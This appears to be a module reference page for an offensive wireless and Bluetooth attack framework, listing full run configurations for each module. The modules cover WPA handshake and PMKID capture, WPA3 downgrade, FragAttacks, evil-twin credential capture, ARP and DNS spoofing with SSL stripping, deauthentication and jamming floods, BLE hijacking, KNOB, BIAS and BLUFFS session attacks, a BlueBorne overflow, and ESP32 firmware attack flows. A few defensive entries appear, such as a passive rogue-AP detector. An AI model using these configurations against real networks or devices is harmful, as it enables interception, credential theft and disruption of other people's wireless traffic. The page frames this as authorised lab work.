# 08 — Generic Modules

> Complete reference for all `generic/*` modules with full syntax, options and usage samples.

**Author:** André Henrique (@mrhenrike) | União Geek

---

## generic/wifi_lab — Wi-Fi Attack Lab

### handshake_snooper

PMKID-first pipeline + deauth-based WPA2 handshake capture.

```
use generic/wifi_lab/handshake_snooper
set interface wlan0mon
set target_bssid AA:BB:CC:DD:EE:FF
set target_channel 6
set pmkid_first true            # attempt PMKID before deauth (default: true)
set pmkid_timeout 30            # seconds for PMKID attempt
set deauth_count 5
set capture_seconds 30
run
```

---

### wpa3_attack_suite

WPA3 Dragonblood suite — SAE flood, CSA, Double SSID clone, downgrade.

```
use generic/wifi_lab/wpa3_attack_suite
set interface wlan0mon
set target_bssid AA:BB:CC:DD:EE:FF
set target_channel 6
# attack: downgrade | sae_flood | csa | double_ssid | timing | auto
set attack auto
set csa_harvest true            # capture PMKID/EAPOL during CSA window
set dry_run false
run
```

---

### fragattacks

FragAttacks CVE-2020-26140+ with 802.11ax HE capability detection.

```
use generic/wifi_lab/fragattacks
set interface wlan0mon
set target_bssid AA:BB:CC:DD:EE:FF
set target_ip 192.168.1.1
run
# Output will show HE (Wi-Fi 6) capability status on the interface PHY.
```

---

### evil_twin_workflow

Full evil-twin with optional credential capture verification.

```
use generic/wifi_lab/evil_twin_workflow
set target_ssid "MyNetwork"
set target_bssid AA:BB:CC:DD:EE:FF
set target_channel 6
set ap_interface wlan1
set deauth_interface wlan0mon
set verify_on_capture true
set handshake_capture_path /tmp/capture.cap
set captured_password s3cr3t
run
```

---

### mitm_wifi_bridge

ARP spoofing, DNS spoofing, and Ghost combo (bettercap).

```
use generic/wifi_lab/mitm_wifi_bridge
# mode: ap_bridge | arp_spoof | dns_spoof | ghost_combo | ssl_strip
set mode ghost_combo
set upstream_interface eth0
set target_ip 192.168.1.100
set dns_target "*.corp.local"
set dns_redirect_ip 192.168.1.50
run
```

---

### auth_flood

Authentication flood, amok mode, mesh flood (mdk4 backend).

```
use generic/wifi_lab/auth_flood
set interface wlan0mon
# mode: auth_flood | amok_mode | mesh_flood | eapol_start | cts_nav
set mode auth_flood
set target_bssid AA:BB:CC:DD:EE:FF
set backend mdk4
run
```

---

### adaptive_harvest

Score-driven PMKID/handshake collection with adaptive channel rotation.

```
use generic/wifi_lab/adaptive_harvest
set interface wlan0mon
set channels 1,6,11
set rounds 5
set round_seconds 25
run
```

---

### wardriving_deauth_loop

Automated wardriving: scan → deauth → capture cycles.

```
use generic/wifi_lab/wardriving_deauth_loop
set interface wlan0mon
set scan_seconds 30
set deauth_burst 5
set cycles 3
run
```

---

### wireless_ids

Passive IDS: baseline BSSID learning + rogue AP detection.

```
use generic/wifi_lab/wireless_ids
set baseline_csv /path/to/baseline_airodump.csv
set current_csv /path/to/current_airodump.csv
set min_signal -85
run
```

---

### awdl_attack

AWDL/AirDrop lab workflows using opendrop and owl.

```
use generic/wifi_lab/awdl_attack
set interface wlan0mon
# action: discover | send_test | dos_test
set action discover
run
```

---

### momo_integrated_attack

KARMA lure + PMKID-first + downgrade pressure in one authorised-lab workflow.

```
use generic/wifi_lab/momo_integrated_attack
set interface wlan0mon
set run_karma true
set run_pmkid true
set run_downgrade true
run
```

---

## generic/pcap — PCAP Analysis

### pcap_sql_workspace

SQLite workspace for PCAP metadata and analyst notes.

```
use generic/pcap/pcap_sql_workspace
set db_path .log/pcap_workspace.db
# action: init | import | list
set action init
run

set action import
set pcap_path /path/to/capture.pcap
set label "TrOll_2.4GHz lab capture 2026-04-08"
run

set action list
run
```

---

## generic/bluetooth — Bluetooth / BLE

### ble_btlejack

BLE sniff, jam, and hijack via BTLEJack.

```
use generic/bluetooth/ble_btlejack
# action: sniff | jam | hijack
set action sniff
set channel 37
set output_pcap .log/ble_capture.pcap
run
```

### bt_session_attack

KNOB, BIAS, BLUFFS session attacks.

```
use generic/bluetooth/bt_session_attack
set target_addr AA:BB:CC:DD:EE:FF
# attack: knob_bruteforce | bias | bluffs
set attack knob_bruteforce
set entropy 7
set allow_unsafe_knob false     # guard: blocks entropy < 7
run
```

### blueborne_attack

BlueBorne L2CAP overflow with kernel offset profiles.

```
use generic/bluetooth/blueborne_attack
set target_addr AA:BB:CC:DD:EE:FF
# kernel_profile: ubuntu_16_04 | ubuntu_18_04 | android_7_bluez | android_8_bluez
set kernel_profile ubuntu_18_04
run
```

---

## generic/external — External Bridges

### bruce_serial_bridge

Serial flow engine for Bruce firmware (ESP32). Full syntax:

```
use generic/external/bruce_serial_bridge
set serial_port /dev/ttyACM0
set baudrate 115200
# Predefined flow profiles:
set flow_profile capture_handshake_flow
# Other profiles:
#   baseline_status_flow, wifi_menu_navigation_flow, sniffer_capture_flow,
#   wifi_attack_lab_flow, deauth_clone_verify_flow, evil_portal_karma_flow,
#   raw_sniffer_probe_flow, navigation_recovery_flow, wifi_bruteforce_recon_flow,
#   captive_portal_endpoint_config_flow, repeater_wisp_setup_flow,
#   external_adapter_probe_flow, webui_password_flow, target_attack_stability_flow,
#   ble_recon_spam_flow, ble_badble_recovery_flow,
#   rf_spectrum_scan_flow, rf_jammer_stability_flow
set step_delay_ms 250
set read_window_ms 1200
set retries_per_step 1
set fail_on_expect_miss false
set output_log .log/bruce_serial_bridge.log
set dry_run false
run
```

Custom declarative flow (flow_json):

```
use generic/external/bruce_serial_bridge
set serial_port /dev/ttyACM0
set flow_json [{"command":"wifi scan","expect":"#","wait_ms":1200},{"command":"nav back","repeat":2,"expect":"#"}]
run
```

---

### bruce_upstream_tracker

Browse BruceDevices/firmware issues and PRs catalog.

```
use generic/external/bruce_upstream_tracker
# view: summary | top_useful | by_category | open_high | open_high_pending | open_pending
set view summary
run

set view open_pending
set limit 20
run

set view by_category
set category ble
run
```

---

### airgeddon_bridge

Airgeddon multi-mode subprocess bridge.

```
use generic/external/airgeddon_bridge
# mode: handshake | wps | evil_twin | pmkid | deauth | wpa3_downgrade | menu
set mode handshake
set interface wlan0mon
set target_bssid AA:BB:CC:DD:EE:FF
set target_channel 6
run
```

---

### wireless_tool_prereq_audit

Check all required external tools are installed and in PATH.

```
use generic/external/wireless_tool_prereq_audit
run
```

---

*See [docs/FULL_CATALOG.md](../FULL_CATALOG.md) for the complete auto-generated module index.*
